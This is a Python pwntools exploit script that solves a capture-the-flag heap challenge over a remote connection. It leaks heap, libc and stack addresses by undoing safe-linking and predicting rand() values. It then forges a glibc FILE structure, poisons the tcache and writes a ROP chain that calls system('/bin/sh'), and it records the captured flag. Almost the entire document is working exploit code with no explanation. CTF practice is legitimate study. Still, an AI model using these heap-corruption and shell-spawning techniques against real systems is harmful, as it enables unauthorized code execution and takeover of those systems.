#!/usr/bin/python3
from pwn import *
import ctypes

sla = lambda delim, data: p.sendlineafter(delim, data)
sa = lambda delim, data: p.sendafter(delim, data)
s = lambda data: p.send(data)
sl = lambda data: p.sendline(data)
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()


elf = context.binary = ELF('chall')
libc = ELF('libc.so.6')

def int_from_bytes(bytes):
    return int.from_bytes(bytes, byteorder='little')
def choice(i):
    sla(b'>', str(i).encode())
def create(size):
    choice(1)
    sla(B'choncc', str(size).encode())
def view(id):
    choice(2)
    sla(b'choncc', str(id).encode())
def edit(id, data):
    choice(3)
    sla(b'choncc', str(id).encode())
    sa(b'content', data)
def remove(id):
    choice(4)
    sla(b'choncc', str(id).encode())
def open_c():
    choice(5)
def close_c():
    choice(6)
def write_c():
    choice(7)
def deobfuscate(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val
def GDB(proc):
    gdb.attach(p, gdbscript='''
               set *($rbx - 2029792 + 1128958)=0xc3
               #b read
               b system
               c
               ''')

#p = process()
#context.log_level = 'debug'
p = remote('193.148.168.30', 7669)

lib = ctypes.cdll.LoadLibrary('libc.so.6')
now = lib.time(0)
lib.srand(now)
#GDB(p)

for i in range(2):
    create(0x10)
for i in range(2):
    remove(1)
create(8)
view(1)
ru(b'1: ')
leak = rl()[:-1]
leak = int_from_bytes(leak)
leak = deobfuscate(leak)
print('leak: ', hex(leak))
heap = leak - 0x2a0
print('heap: ', hex(heap))

open_c()
for i in range(2):
    create(8)
close_c()
create(0x1d0)


rand_arr = []
i = 0
while(i <= 463):
    lib.rand()
    rand_arr.append(lib.rand())
    i += 4

leak_arr = []
view(4)
p.recvuntil(b'4: ')
leak = r(0x1d0)
#rint(rand_arr)
for i in range(0, 0x1d0, 4):
    num = leak[i:i+4]
    num = int_from_bytes(num)
    num ^= rand_arr[i // 4]
    #print(hex(num))
    leak_arr.append(num)
#print(hex(leak_arr[26]))
#print(hex(leak_arr[27]))
leak = leak_arr[27] << 32
leak += leak_arr[26]
print('leak: ', hex(leak))
libc.address = leak - 2032864
print('libc: ', hex(libc.address))

O_MAGIC = 0xFBAD0000
flag = 0x00000000fbad2484
vtable = libc.address + 2023472
lib_addr = libc.address + 2032864
file = p64(flag) + p64(0)*12 + p64(lib_addr) + p64(3) + p64(0)*2 + p64(heap + 0x400)
file += p64(0xffffffffffffffff) + p64(0) + p64(heap + 0x410) + p64(0)*6 + p64(vtable)
file = file.ljust(0x1d0, b'\x00')
edit(4, file)
close_c()
flag = 0x00000000fbad2484
vtable = libc.address + 2023472
lib_addr = libc.address + 2032864
file = p64(flag) + p64(0)*12 + p64(lib_addr) + p64(3) + p64(0)*2 + p64(heap + 0x400)
file += p64(0xffffffffffffffff) + p64(0) + p64(heap + 0x410) + p64(0)*6 + p64(vtable)
file = file.ljust(0x1d0, b'\x00')
edit(4, file)
close_c()
create(0x40)
tcache_addr = heap + 800
target = heap + 736
edit(4, p64((tcache_addr >> 12) ^ target))
open_c()
remove(4)
open_c()
create(0x1d0)
edit(4, p64(0x100) + p64(libc.symbols['environ']))
view(1)
ru(b'1: ')
leak = r(8)
leak = int_from_bytes(leak)
stack = leak
print('stack: ', hex(stack))
ret = stack - 336
edit(4, p64(0x100) + p64(ret))
RET = 0x00000000000bc089 + libc.address#: xor rax, rax ; ret

rop = ROP(libc)
rop.raw(RET)
rop.system(next(libc.search(b'/bin/sh\x00')))
edit(1, rop.chain())
#L3AK{C0rRuPt3d_FIL3_structs_L0V3_CH0NCC_D474}

p.interactive()